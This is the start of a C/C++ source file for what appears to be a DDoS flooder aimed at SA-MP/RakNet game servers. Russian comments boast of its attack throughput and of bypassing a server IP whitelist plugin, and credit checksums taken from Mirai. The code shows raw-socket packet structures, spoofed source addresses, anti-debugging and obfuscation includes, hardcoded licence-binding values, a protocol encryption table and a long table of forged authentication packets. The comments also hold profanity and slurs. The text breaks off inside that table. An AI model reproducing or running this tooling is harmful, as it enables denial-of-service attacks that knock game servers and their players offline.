/*  
	* This is released under the GNU GPL License v3.0, and is allowed to be used for commercial products ;)  
*/
//yum install tcpdump
//yum -y install epel-release
//yum -y install vnstat
//service vnstat start
//chkconfig vnstat on
//yum install libstdc++.i686
//yum install libstdc++-devel.i686
//yum install glibc.i686
//yum install gcc-c++
//yum install glibc-devel
//yum install glibc-static libstdc++-static -y;
//yum install libgcc 
//yum install centos-release-scl
//yum install devtoolset-8-gcc devtoolset-8-gcc-c++
//scl enable devtoolset-8 -- bash         это после каждого входа в впс ввидить в командную строку что бы скомпилировать скрипт
//yum install boost-devel
//компил под х32
//cd /usr/include/c++/4.4.6/
//mkdir x86_64-redhat-linux
//cd x86_64-redhat-linux
//ln -s ../i686-redhat-linux 32
//only centos x64
//пример запуска для замера скорости и pps ./sampsu 30 sockaddr 0 0 1 0 & vnstat -l -i ens192
//пример запуска для капта трафика tcpdump -i ens192 port 7777 -w file.pcap & ./sampsu 1 sockaddr 0 0 10 1
//последние обновы за 05.09.22 белка стеганула, мб осеннее обострение, хз
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>            // struct addrinfo
#include <sys/types.h>        // needed for socket()
#include <sys/socket.h>
#include <sys/mman.h>
#include <netinet/in.h>       // IPPROTO_RAW, IPPROTO_IP, IPPROTO_UDP
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>        // macro ioctl is defined
#include <sys/socket.h>
#include <bits/ioctls.h>      // defines values for argument "request" of ioctl.
#include <stdlib.h>
#include <mcheck.h>
#include <stdbool.h>
#include <ifaddrs.h>
#include <cpuid.h>
#include <set>
#include <array>
#include <math.h>
#include <malloc.h>
#include <iostream>
#include <limits>
#include <unistd.h>
#include <fstream>
#include <pwd.h>
#include <sys/sysinfo.h>
#include <vector>
#include <linux/kernel.h>
#include <linux/tcp.h>
#include <sys/time.h>
#include <sys/sysctl.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/ether.h>
#include "./Lib/MetaString.h"
#include "./Lib/DetectDebugger.h"
#include "./Lib/ObfuscatedCallWithPredicate.h"
#include "./Lib/ObfuscatedCall.h"
#include "./Lib/instr.h"
#pragma GCC diagnostic push
#pragma GCC diagnostic warning "-w"
//чексамы взял с мираи о да и мне похуй, идите нахуй, сами же все пиздите а других хейтите
//КАК ОПРЕДЕЛИТЬ СИГНАТУРЫ ПАКЕТОВ ID_PING И ID_PONG? ПОКА РАЗБИРАЮСЬ
//RaknetIPWhiteList.so САСАНУЛ ТАК, ЧТО СЕРВЕР ОХУЕЛ ;)
//ФИКС ЕСТЬ, НО ВАМ ЕГО НЕ ВИДАТЬ ДО ТЕХ ПОР, ПОКА Я НЕ СВАЛЮ С ЭТОЙ ДЫРЫ...
//ПОСЛЕ КАЖДОЙ КОМПИЛЯЦИИ УДАЛЯТЬ СКОМПИЛИРОВАНЫЙ СКРИПТ И ПЕРЕКОМПИЛИРОВАТЬ ЗАНОВО, ЧТО БЫ НЕ ВЫЛАЗИЛИ ОШИБКИ. ЭТО ВСЕ ИЗЗА ОБФУСКАТОРОВ
//в один поток удалось выжать 50mbps, в 16 потоков 100mbps. С учетом днище-ВПС! Не рекомендуется ставить больше 1 потока, исключительно для грубой силы!
//все настраивать в зависимости от политики аппаратных фильтнов того или иного проекта, без определенных навыков и занний вы не сможете использовать скрипт корректно для достижения той или иной цели
//технология ведения атак очень уникальна, мы одни из первых кому удалось сделать такой прорыв в сфере ведения атак! (c)ZHS 2015-2022
//192.168.0.102:2335
//192.168.0.105:7777
//дальше один пустой отступ
#define MAX_PACKET_SIZE 8192//4096 или 8192 //И ТАК СОЙДЕТ
#define PHI 0x9e3779b9
#define ID_OPEN_CONNECTION_REQUEST 24 //037
#define NETCODE_CONNCOOKIELULZ 0x6969 //037
/////////////////////////////////////НАСТРОЙКА СКРИПТА ЕСЛИ ВДРУГ ТЫ ДАУН И У ТЕБЯ ВЫЛЕЗЛА СЕГМЕНТАЦИЯ//////////////////////////////////////////////
#define IP	"45.43.76.93" //привязка по ип машины, шоб педоры не украли скрипт
#define KEY "B2ZYNI-EJEB-VQNM-MJI3-VUZU-QF" //привязка по железу, шоб педоры не украли скрипт
#define DEFAULT_IF	"ens32" //у каждой тачки свой сетевой интерфейс, чекать при каждом новом заказе тачки и заменять. Пример: eth0. Своего рода служит привязкой и не только
#define sampchecksumma	"sockaddr" //привязка по паролю, шоб педоры не украли скрипт
#define nexttonext 1 //1 раз в 44 секунды. Динамически настраивать разрешено, от 33 секунд до 120 секунд, не более(240000ms в особых случаях) Это время атаки на 1 ип из списка с последующим переходом на другой ип с таким же диапазоном времени






unsigned char src_ips[4];
int TypeGenIP;
unsigned char src_ip[4];
char* query[] = { "p", "i", "c", "d", "r", "x" };
int   r_num_a_p;
int type;
int pps;
int num_threads;
int prottl;
char pingfix1;
char pingfix2;
int zalupa;
int zalup;
unsigned long send_seq;
char sourceiptcp[25];
int sampvector = 22; //0x16
char conversion[2];
int sequence = 0;
int auth_index2 = 0;
int auth_index3 = 0;
int auth_index = 0;
int checked = 0;
int sockfd;
struct ifreq if_idx;
struct ifreq if_mac;
int tx_len = 0;
char sendbuf[1024];
struct ether_header* eh = (struct ether_header*)sendbuf;
struct iphdr* ipeth = (struct iphdr*)(sendbuf + sizeof(struct ether_header));
struct sockaddr_ll socket_address;
char ifName[IFNAMSIZ];
using namespace std;
using namespace andrivet::ADVobfuscator;
int szpacket;
unsigned short NumID;
unsigned short NumID_TCP;
static uint32_t Q[4096], c = 362436;
static unsigned int dst_port;
char sourceip[25];
char dup_ip[4];
char *dst_ip;  
unsigned char ip[4];   
char datagram[MAX_PACKET_SIZE];
unsigned char * datagram_tcp[MAX_PACKET_SIZE];
struct iphdr *iph = (struct iphdr *)datagram;
struct iphdr *iphtcp = (struct iphdr *)datagram_tcp;
char commands[15][16] = { "mymember", "echo", "hostname", "gamemodetext", "mapname", "cmdlist", "varlist", "kick", "ban", "rcon_password", "players", "say", "gmx", "loadfs", "language" };
char abc[] = "abcdefghijklmnopqrstuvwxyz0123456789.";
struct DetectDebugger { bool operator()() { return AmIBeingDebugged(); } };
struct phdr 
{
	u_int32_t source;
	u_int32_t dest;
	u_int8_t zero;
	u_int8_t protocol;
	u_int16_t udph_length;
};
struct thread_data 
{ 
	int thread_id; 
	struct slist *list_node; 
	struct sockaddr_in sin; 
	struct abuse_list* list_node_abuse;
};
struct thread_data_tcp 
{ 
	int thread_id_tcp; 
	struct slist *list_node; 
	struct sockaddr_in sin; 
	struct abuse_list* list_node_abuse;
};
struct slist
{
	struct sockaddr_in datalist;
	struct slist *snext;
	struct slist *prev;
};
struct slist *head;
////////////////////////////
struct abuse_list
{
	struct sockaddr_in adata;
	struct abuse_list* anext;
	struct abuse_list* aprev;
};
struct abuse_list* ahead;

unsigned char encrBuffer[4092];
unsigned char sampEncTmpBuff[4096];
unsigned char sampEncrTable[256] = //ты кто нахуй?
{
	0x27, 0x69, 0xFD, 0x87, 0x60, 0x7D, 0x83, 0x02, 0xF2, 0x3F, 0x71, 0x99, 0xA3, 0x7C, 0x1B, 0x9D,
	0x76, 0x30, 0x23, 0x25, 0xC5, 0x82, 0x9B, 0xEB, 0x1E, 0xFA, 0x46, 0x4F, 0x98, 0xC9, 0x37, 0x88,
	0x18, 0xA2, 0x68, 0xD6, 0xD7, 0x22, 0xD1, 0x74, 0x7A, 0x79, 0x2E, 0xD2, 0x6D, 0x48, 0x0F, 0xB1,
	0x62, 0x97, 0xBC, 0x8B, 0x59, 0x7F, 0x29, 0xB6, 0xB9, 0x61, 0xBE, 0xC8, 0xC1, 0xC6, 0x40, 0xEF,
	0x11, 0x6A, 0xA5, 0xC7, 0x3A, 0xF4, 0x4C, 0x13, 0x6C, 0x2B, 0x1C, 0x54, 0x56, 0x55, 0x53, 0xA8,
	0xDC, 0x9C, 0x9A, 0x16, 0xDD, 0xB0, 0xF5, 0x2D, 0xFF, 0xDE, 0x8A, 0x90, 0xFC, 0x95, 0xEC, 0x31,
	0x85, 0xC2, 0x01, 0x06, 0xDB, 0x28, 0xD8, 0xEA, 0xA0, 0xDA, 0x10, 0x0E, 0xF0, 0x2A, 0x6B, 0x21,
	0xF1, 0x86, 0xFB, 0x65, 0xE1, 0x6F, 0xF6, 0x26, 0x33, 0x39, 0xAE, 0xBF, 0xD4, 0xE4, 0xE9, 0x44,
	0x75, 0x3D, 0x63, 0xBD, 0xC0, 0x7B, 0x9E, 0xA6, 0x5C, 0x1F, 0xB2, 0xA4, 0xC4, 0x8D, 0xB3, 0xFE,
	0x8F, 0x19, 0x8C, 0x4D, 0x5E, 0x34, 0xCC, 0xF9, 0xB5, 0xF3, 0xF8, 0xA1, 0x50, 0x04, 0x93, 0x73,
	0xE0, 0xBA, 0xCB, 0x45, 0x35, 0x1A, 0x49, 0x47, 0x6E, 0x2F, 0x51, 0x12, 0xE2, 0x4A, 0x72, 0x05,
	0x66, 0x70, 0xB8, 0xCD, 0x00, 0xE5, 0xBB, 0x24, 0x58, 0xEE, 0xB4, 0x80, 0x81, 0x36, 0xA9, 0x67,
	0x5A, 0x4B, 0xE8, 0xCA, 0xCF, 0x9F, 0xE3, 0xAC, 0xAA, 0x14, 0x5B, 0x5F, 0x0A, 0x3B, 0x77, 0x92,
	0x09, 0x15, 0x4E, 0x94, 0xAD, 0x17, 0x64, 0x52, 0xD3, 0x38, 0x43, 0x0D, 0x0C, 0x07, 0x3C, 0x1D,
	0xAF, 0xED, 0xE7, 0x08, 0xB7, 0x03, 0xE6, 0x8E, 0xAB, 0x91, 0x89, 0x3E, 0x2C, 0x96, 0x42, 0xD9,
	0x78, 0xDF, 0xD0, 0x57, 0x5D, 0x84, 0x41, 0x7E, 0xCE, 0xF7, 0x32, 0xC3, 0xD5, 0x20, 0x0B, 0xA7
};

char samp_conn1[12][5] = {
	"\x88\x1e\x1f\x53",
	"\xa0\x1e\x0b\x21",
	"\x88\x1e\xf3\xdc",
	"\xaa\x1e\x63\x8a",
	"\x8a\x1e\xe1\x65",
	"\xa8\x1e\xb7\xdc",
	"\xaa\x1e\xcf\x63",
	"\x0a\x1e\x4e\x5e",
	"\x8a\x1e\x29\x8b",
	"\x0a\x1e\x93\xce",
	"\xa8\x1e\xad\x60",
	"\x08\x1e\xa0\xb3",
};

char samp_conn2[9][5] = {
	{0x88, 0x1e, (char)(rand() & 0xFF), (char)(rand() & 0xFF)},
	{0xa0, 0x1e, (char)(rand() & 0xFF), (char)(rand() & 0xFF)},
	{0x88, 0x1e, (char)(rand() & 0xFF), (char)(rand() & 0xFF)},
	{0xaa, 0x1e, (char)(rand() & 0xFF), (char)(rand() & 0xFF)},
	{0x8a, 0x1e, (char)(rand() & 0xFF), (char)(rand() & 0xFF)},
	{0xa8, 0x1e, (char)(rand() & 0xFF), (char)(rand() & 0xFF)},
	{0xaa, 0x1e, (char)(rand() & 0xFF), (char)(rand() & 0xFF)},
	{(char)(rand() & 0xFF), 0x1e, (char)(rand() & 0xFF), (char)(rand() & 0xFF)},
	{0x0a, 0x1e, (char)(rand() & 0xFF), (char)(rand() & 0xFF)},
};

char auth_table[512][49] = {
	"\x02\x27\xd8\x11\x4d\xfd\x0e\x7a\x97\x61\xf4\x97\x11\x4c\x11\x8b\xd2\x29\xf4\xb6\x08\x6a\xc7\x7f\x14\xbc\xcf\xb9\xcc\xc7\x84\x4c\x84\x29\x14\x97\x1b\x4c\x14\xa5\x14\xb9\x3a\x97\x6a\x62\xd2\xb6",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\x3a\x8b\x11\xb6\x1b\x62\x59\x59\x1b\x59\xf4\x4c\x84\xf4\x1b\xb9\xe1\xbc\x6a\xa5\x08\x59\x97\x8b\xe1\x8b\x84\x8b\x14\xf4\x6a\x62\xd2\x3a\x1b\xf4\xc7\xb6\xcc\x3a",
	"\x22\x27\xd8\x11\x4d\xfd\x0e\x7a\x97\x97\xcf\xb9\xcf\x3a\xf4\x97\xc7\x3a\x84\x97\xf4\x29\xf4\x61\x11\xb9\x11\xb9\x14\xb6\x59\x59\xcf\x62\x3a\xc7\xcc\x8b\xc7\x6a\x59\x3a\x08\xc7\xc7\x7f\x1b\x62",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\x97\xbc\xc7\x59\x6a\x29\x3a\xa5\x08\x29\x97\x61\xe1\x6a\x08\x59\x1b\x4c\xe1\x59\x1b\x8b\x11\xa5\x1b\x62\xf4\x61\x1b\x4c\xc7\x3a\xcc\x97\x08\xa5\x1b\x4c\x6a\xbc",
	"\x20\x27\xd8\x11\x4d\xfd\x0e\x7a\x6a\x3a\x14\xb9\xd2\x29\x08\x3a\xc7\xbc\x3a\x29\x26\x8b\xd2\x4c\x26\x3a\x11\xb6\xd2\x7f\x14\xb6\x59\x7f\x1b\x3a\x1b\x7f\x59\x29\x11\x4c\x6a\xb9\x59\x3a\x26\x6a",
	"\x22\x27\xd8\x11\x4d\xfd\x0e\x7a\x08\x62\x11\xb9\xe1\xb6\x26\x6a\x1b\xa5\x26\xb6\xc7\xa5\xd2\xf4\xe1\x61\x08\x61\xcc\x62\x59\xc7\xc7\x8b\xcc\xb6\x6a\xb6\x14\xb9\xf4\x97\x08\xb6\xc7\x62\x14\x29",
	"\x08\x27\xd8\x11\x4d\xfd\x0e\x7a\xf4\x7f\xc7\xa5\x84\x7f\x97\x4c\x1b\x3a\x84\x59\x97\x61\xcf\xbc\xc7\x8b\x08\x97\x26\x62\x6a\xf4\xc7\x8b\xe1\x61\xd2\xbc\xcc\x6a\x6a\x59\xe1\xbc\x84\x62\x08\x29",
	"\x02\x27\xd8\x11\x4d\xfd\x0e\x7a\x3a\xb9\xcf\xf4\x97\x29\xc7\x29\xd2\x8b\x59\xc7\x08\xa5\xd2\x29\xc7\x7f\x97\xc7\xcc\x3a\x97\x7f\x59\x59\xe1\x3a\x14\x29\x11\x4c\x59\xf4\x1b\x61\x11\x61\xcc\x62",
	"\x08\x27\xd8\x11\x4d\xfd\x0e\x7a\xf4\xf4\xd2\x62\x97\x7f\x6a\xb6\xd2\xb6\x14\xb9\x1b\xb9\x11\x97\xd2\xbc\x11\x8b\x26\xb9\x3a\xb9\xd2\x6a\x26\xbc\x97\xc7\x3a\x6a\x11\xa5\x11\x29\x26\x3a\xd2\xf4",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\x84\xc7\x26\x4c\xcf\x62\xf4\x4c\x26\xbc\xcf\x6a\x59\x8b\x08\xb6\xcf\x4c\xc7\xb9\x08\x6a\x08\xb6\x59\xf4\x08\xb9\x97\x29\x84\x6a\x3a\xb6\x84\x59\xcc\xb6\xe1\x29",
	"\x20\x27\xd8\x11\x4d\xfd\x0e\x7a\xd2\x62\x59\x8b\x84\x29\x08\x61\x97\x59\x59\x4c\xd2\xf4\xe1\x3a\x08\x4c\x97\xb6\x08\xc7\x3a\xbc\x14\x4c\x59\x61\xe1\x8b\x26\x61\x08\x97\xcc\xc7\x08\xb9\x1b\x8b",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\x59\xa5\x08\x3a\x11\x61\x59\x4c\x59\x3a\x1b\x7f\x6a\x7f\x6a\x7f\x97\xbc\x14\x97\x84\x4c\x14\x29\x08\xb6\x26\xb6\xe1\xc7\xf4\x4c\xd2\x62\x11\x97\xc7\xbc\x26\x97",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\x08\x61\x08\xb6\x11\xa5\x26\x4c\xc7\x61\x6a\xb9\x1b\xb6\xc7\x4c\x11\x61\x11\x62\x14\xb6\xe1\xb6\x84\x7f\x3a\x97\x11\x4c\x14\x7f\xcc\xa5\x1b\xbc\x6a\x29\xf4\x3a",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\x59\xc7\x84\x29\xf4\x4c\x84\x97\xcf\x8b\x3a\x7f\x08\x3a\xcf\xa5\xcf\x59\xcc\x6a\x84\x6a\xf4\xbc\x08\xb6\xcf\x62\x26\xa5\x08\x6a\xe1\x4c\xcc\x61\x6a\x6a\xe1\x97",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\x84\xf4\x14\xb6\x59\x29\x1b\x62\xcf\x61\x08\x97\xcc\x62\x3a\x59\xc7\xbc\x1b\x97\xf4\x3a\x08\xbc\x59\x97\x1b\x59\xf4\xb6\xf4\xa5\x26\x6a\xd2\xc7\x26\x62\x26\x4c",
	"\x08\x27\xd8\x11\x4d\xfd\x0e\x7a\xcc\x62\x97\x29\x11\x6a\xcf\x59\xc7\xc7\xcf\xa5\xcc\x29\x14\xbc\x1b\x4c\x08\x62\x59\x6a\x84\xb6\xd2\x97\xf4\x3a\x26\xa5\xcc\x6a\x3a\xf4\x26\xa5\xe1\x61\x3a\x4c",
	"\x02\x27\xd8\x11\x4d\xfd\x0e\x7a\x08\x4c\xf4\x8b\x6a\x3a\xcc\x8b\x97\xb9\xcc\xc7\xd2\xbc\x14\x7f\x59\xbc\x1b\xa5\x14\x59\xe1\xf4\x14\xf4\xe1\xa5\xf4\xf4\x3a\x6a\x6a\x7f\xcf\x97\xc7\x8b\x08\x97",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\xc7\x97\x1b\xc7\x11\x4c\xcc\xc7\x59\x97\x1b\x4c\xcf\x61\x08\x6a\x1b\xb9\x97\xb9\xf4\x29\xe1\xb9\x6a\xb9\x6a\x4c\x6a\xb6\xe1\xb6\xcf\xb6\xcc\xc7\x11\x8b\x08\xbc",
	"\x02\x27\xd8\x11\x4d\xfd\x0e\x7a\xc7\xc7\xf4\xf4\xf4\x7f\xf4\xa5\xd2\x3a\xd2\x97\x14\x97\xd2\xa5\x3a\xb9\x14\x29\x1b\xc7\xc7\x62\xf4\x7f\x84\x62\x59\xa5\xd2\x6a\x97\xb9\x14\x8b\x14\x3a\x1b\xf4",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\x59\x97\x14\xb9\xc7\x59\x84\xb9\xe1\x29\xc7\xb9\x59\xf4\xcf\xb6\xf4\x59\x3a\xc7\xf4\x6a\x3a\x6a\x6a\x29\x26\x4c\x08\xbc\xcc\x4c\x14\x3a\xd2\x8b\xcc\x7f\x3a\xa5",
	"\x00\x27\xd8\x11\x4d\xfd\x0e\x7a\x59\xbc\xcf\xc7\xf4\xa5\x59\xa5\xcc\x6a\xf4\x97\x84\x29\x3a\xb9\x14\xc7\xf4\x61\x97\xb9\xc7\xc7\x1b\xb6\x3a\x7f\x59\xb6\xd2\x61\xcc\x62\x11\x6a\xe1\xb9\x1b\xa5",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\x97\x6a\x6a\x97\x26\x8b\x11\xa5\xcf\x61\x59\x29\x1b\x59\xc7\x59\xc7\x29\x3a\x61\x97\x7f\xc7\x97\xc7\x97\x14\x7f\xd2\xa5\x3a\xb6\xc7\x59\x97\x61\x1b\x4c\x14\x3a",
	"\x00\x27\xd8\x11\x4d\xfd\x0e\x7a\xc7\xf4\xe1\x59\x84\xb9\x59\xf4\x14\x59\xe1\x61\xd2\xf4\xcf\x29\xf4\x62\xf4\xbc\x59\xb6\x08\x29\x97\x62\x97\xc7\x59\x62\x84\x62\x14\x29\x1b\xb6\xf4\x62\x3a\x6a",
	"\x22\x27\xd8\x11\x4d\xfd\x0e\x7a\xcc\x61\x6a\x7f\x84\xa5\x97\x59\x14\xa5\x6a\x3a\xcc\x8b\x97\x7f\xd2\x7f\x97\xb6\xcf\xb9\xc7\x97\x97\xb6\x14\xf4\x26\x4c\xf4\x4c\x11\x7f\xcc\xa5\xf4\x6a\x1b\x61",
	"\x08\x27\xd8\x11\x4d\xfd\x0e\x7a\x97\xb9\xc7\x29\xc7\xbc\xcf\x97\x1b\xf4\x97\x59\x59\xc7\xcf\xb6\x3a\xb6\xc7\x6a\x59\xb6\xf4\xc7\xe1\x29\xf4\x62\xcc\x3a\x84\xb9\x3a\x59\x59\x97\x26\x62\xd2\xbc",
	"\x02\x27\xd8\x11\x4d\xfd\x0e\x7a\x1b\xb6\x59\x29\x26\x4c\x97\xf4\xc7\x7f\x59\x3a\x97\xb9\x08\x7f\x59\x3a\x14\x7f\x84\x8b\x97\x62\xe1\x8b\x14\xf4\xcf\xf4\x14\x8b\x6a\x3a\x59\xc7\x59\x61\xcc\x29",
	"\x08\x27\xd8\x11\x4d\xfd\x0e\x7a\xc7\x7f\x84\xa5\xd2\x6a\x3a\xf4\xf4\x4c\x14\x61\x26\xb9\x08\xb6\x08\x62\x11\xf4\xcf\x59\x26\xc7\x97\x62\x59\x62\x11\xf4\x3a\x6a\x97\x61\x11\xf4\xcf\xb9\xcf\xa5",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\xcf\x4c\x97\xa5\x97\xbc\x59\x61\xcc\xbc\x1b\x29\x26\x4c\xf4\x61\x3a\xbc\xcf\x6a\xd2\xa5\xf4\xbc\xf4\xa5\x97\xf4\xcc\xb6\x97\x7f\x1b\xb9\x26\x62\x26\x4c\x59\x4c",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\x3a\xb9\x6a\x4c\x6a\x29\x84\x6a\x08\xb6\x84\x59\x97\x61\xcf\xbc\xcc\x97\xcf\xf4\x1b\x6a\x3a\xc7\x84\x8b\xcf\x62\xf4\x59\x11\xc7\x59\x7f\xcf\x97\x6a\x4c\x08\x4c",
	"\x08\x27\xd8\x11\x4d\xfd\x0e\x7a\x6a\x29\xe1\x61\xcc\xb6\x59\xbc\xc7\x7f\x84\x59\xcf\xb6\xc7\xb9\x11\x4c\x26\xb9\xf4\x3a\x08\xbc\x08\xa5\x11\x8b\xcf\x59\x3a\xa5\x3a\xbc\xd2\xbc\x6a\x29\x14\x62",
	"\x00\x27\xd8\x11\x4d\xfd\x0e\x7a\xc7\x8b\xcf\x61\xe1\x8b\x08\x62\x84\xc7\x08\xbc\x26\x97\x84\x4c\x59\xa5\xf4\x6a\x84\xb6\x59\x97\x97\x8b\xcc\x7f\x26\x3a\x84\x8b\xe1\x7f\x3a\x3a\xcf\x62\x59\x6a",
	"\x22\x27\xd8\x11\x4d\xfd\x0e\x7a\xc7\x3a\x1b\xb6\x1b\xf4\xd2\x59\x6a\x97\x84\x7f\x6a\x62\xc7\x62\xcc\xb9\x1b\x97\x6a\x8b\x1b\x3a\x59\x59\x11\xf4\x59\x4c\x59\x62\xcc\xa5\x14\x97\x97\x4c\xe1\x8b",
	"\x02\x27\xd8\x11\x4d\xfd\x0e\x7a\xcf\x3a\x11\xb6\x26\x7f\x3a\x61\x08\x97\x3a\x7f\xf4\x3a\x08\x29\xe1\x6a\x3a\x3a\x6a\x4c\xf4\xc7\x59\xbc\x1b\x7f\x11\x3a\xcf\x6a\x84\x61\x97\x61\x84\xbc\x3a\xb9",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\x59\x97\x84\x8b\x97\xa5\x97\xf4\x26\xbc\x14\x3a\x6a\x61\xc7\x61\xe1\x59\x26\x62\x84\x62\x6a\xb6\x97\x4c\x3a\x29\x11\x3a\x3a\x7f\x1b\xa5\x3a\x62\xf4\x62\xcf\x6a",
	"\x02\x27\xd8\x11\x4d\xfd\x0e\x7a\x97\xf4\xf4\x3a\x08\xbc\x11\xb6\xe1\x59\x14\x61\x3a\x3a\x08\x8b\x08\x7f\x6a\x62\x6a\x61\xc7\xc7\x6a\xc7\x1b\x61\xcc\x97\xc7\x6a\x97\x8b\x1b\xb9\xcf\xc7\xe1\x6a",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\x14\xb6\x1b\x29\x6a\xc7\xcf\x61\x26\x3a\x11\x59\xcf\x97\x11\x29\x59\x7f\x14\x4c\x3a\xbc\xd2\xa5\x59\xb6\x14\x7f\x14\xf4\x11\x7f\xcc\x6a\xe1\xb9\x08\x7f\xe1\x4c",
	"\x00\x27\xd8\x11\x4d\xfd\x0e\x7a\x97\x61\xf4\xf4\xc7\x4c\xe1\x59\x1b\x97\xe1\xf4\xd2\xc7\x6a\x29\xcc\xb6\x84\x61\xcf\x61\xe1\x59\x97\xc7\x97\xb6\x1b\x6a\x6a\xbc\xc7\x6a\x1b\x29\xd2\x3a\x14\xb9",
	"\x20\x27\xd8\x11\x4d\xfd\x0e\x7a\x26\x61\x59\x61\x84\xbc\xe1\xc7\xcc\x62\x84\xb6\x26\xbc\x26\x7f\x11\xbc\xf4\x6a\x1b\x29\x97\x59\x14\xc7\x14\xc7\xc7\x7f\x26\x62\x6a\xc7\x11\xa5\xcc\x6a\x84\xc7",
	"\x28\x27\xd8\x11\x4d\xfd\x0e\x7a\xe1\x59\xf4\x8b\x1b\x59\xc7\x59\x97\xa5\x59\x7f\x84\xbc\x11\x97\x3a\xa5\xc7\xb6\x3a\xb6\xcc\x4c\x3a\x61\x6a\xc7\x14\xf4\x3a\xb9\x84\x97\x11\xbc\xcf\xbc\x3a\xb9",
	"\x0a\x27\xd8\x11\x4d\xfd\x0e\x7a\x3a\xf4\x26\xb9\xd2\xf4\xcc\x59\xf4\x29\xe1\xa5\xcf\x29\xcf\x7f\x08\x6a\xcc\x29\x97\x61\x97\xa5\xf4\x6a\x84\x62\x26\x8b\xcf\x59\x97\x4c\x59\x6a\xe1\x61\xcf\xa5",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\xc7\x6a\x84\x29\x59\x62\xcf\xf4\x1b\x7f\x6a\xa5\x14\x61\x26\x97\xcc\x29\xc7\xb9\xf4\x3a\x08\xc7\x11\x61\xcf\x62\xcc\xa5\xe1\x29\x3a\x59\x6a\x29\x84\x62\x14\x59",
	"\x02\x27\xd8\x11\x4d\xfd\x0e\x7a\x1b\x8b\x84\x7f\xcc\x29\x84\x59\x1b\xbc\x6a\x3a\x08\xb6\x26\x6a\x6a\xb9\x97\x59\x59\x59\x11\xc7\xcf\xbc\x14\x8b\x14\xc7\x84\x4c\xe1\x6a\xd2\xc7\xcc\x61\x3a\x4c",
	"\x00\x27\xd8\x11\x4d\xfd\x0e\x7a\x26\xb9\x6a\x62\x59\x59\x1b\xbc\x97\xa5\x26\x62\x26\x59\x26\x62\x97\xf4\x97\xbc\x11\x62\xd2\x4c\xc7\xf4\xf4\x7f\xcc\x29\xc7\x4c\xcf\xb9\x84\x62\x26\x7f\x14\x62",
	"\x02\x27\xd8\x11\x4d\xfd\x0e\x7a\xd2\xa5\x6a\x4c\xd2\xc7\xf4\x97\xd2\xbc\xd2\x29\x59\x59\x3a\xc7\xe1\xb9\x08\x3a\xcc\x4c\xd2\xa5\x59\xbc\xc7\x59\x11\x4c\x1b\x6a\x97\xb6\xcc\x61\x84\xb6\xd2\x62",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\x6a\xbc\xc7\xf4\x84\x7f\x14\x59\xf4\xbc\x59\x61\xf4\x97\xc7\x97\xc7\x3a\x59\x4c\xc7\xbc\x6a\x61\x84\x3a\x6a\x6a\xcc\xf4\x3a\x3a\x26\xa5\xcc\xb6\xc7\xbc\x26\xf4",
	"\x00\x27\xd8\x11\x4d\xfd\x0e\x7a\x84\xbc\xc7\xbc\xf4\xf4\xc7\x59\x26\x3a\x6a\xbc\x59\xb6\xe1\x3a\xe1\xf4\x14\x61\xc7\x6a\x08\x7f\xe1\xb6\x08\x7f\x14\xb6\x59\x6a\x97\x62\x1b\xb6\x3a\x3a\x6a\xb9",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\xe1\x6a\xd2\xbc\x97\xa5\x84\x59\xcc\xbc\xc7\xb9\x1b\x6a\xcf\x62\x1b\xb9\xc7\xa5\x97\xb9\x26\xb6\xf4\x29\x14\x6a\xf4\x6a\x97\xb6\x08\x59\x08\xb6\x59\x29\x59\x3a",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\x97\xb9\x59\x97\x08\x4c\x26\x59\x3a\xbc\x59\xb9\x3a\xb6\x11\xc7\x08\x8b\x1b\x97\xcf\x6a\xcf\x8b\xe1\x62\x6a\x6a\x08\xb6\x26\xf4\xcf\x62\xcc\x7f\x84\x7f\x97\x4c",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\xcf\xb9\xd2\x3a\x6a\x97\x84\x3a\x1b\xc7\xf4\x6a\x26\x61\x1b\x7f\x26\x8b\x1b\x4c\x6a\x6a\x3a\x29\x6a\x8b\xcf\xf4\x1b\xb9\xd2\xc7\xc7\x3a\x97\x4c\x97\xf4\xe1\xf4",
	"\x08\x27\xd8\x11\x4d\xfd\x0e\x7a\x08\x97\x11\x29\xe1\xb6\x26\xa5\x97\x6a\x11\x29\x1b\x29\x1b\xc7\x26\x29\x97\x4c\xcf\xbc\x84\x97\x59\x97\xcf\xc7\xd2\x7f\xd2\x29\x08\x61\x84\xc7\xcc\x8b\x1b\x61",
	"\x00\x27\xd8\x11\x4d\xfd\x0e\x7a\x6a\x6a\xcf\xa5\x6a\xb6\x97\x29\x11\xb6\x6a\x8b\x08\x8b\x26\x4c\x3a\xb9\x26\x59\x3a\xb9\xcc\x3a\xcc\x97\x14\x8b\xe1\xbc\xe1\x97\xcc\x6a\x11\x3a\x11\x8b\x26\x4c",
	"\x2a\x27\xd8\x11\x4d\xfd\x0e\x7a\x3a\xb9\xc7\x97\xe1\xc7\xd2\xb9\xe1\x97\xc7\x7f\x97\x4c\x08\xf4\xe1\x6a\x3a\xbc\x14\x97\x97\x4c\xf4\x29\xcf\x61\xcf\x6a\x1b\x6a\xd2\x62\x59\x62\x26\xc7\xf4\xb9",
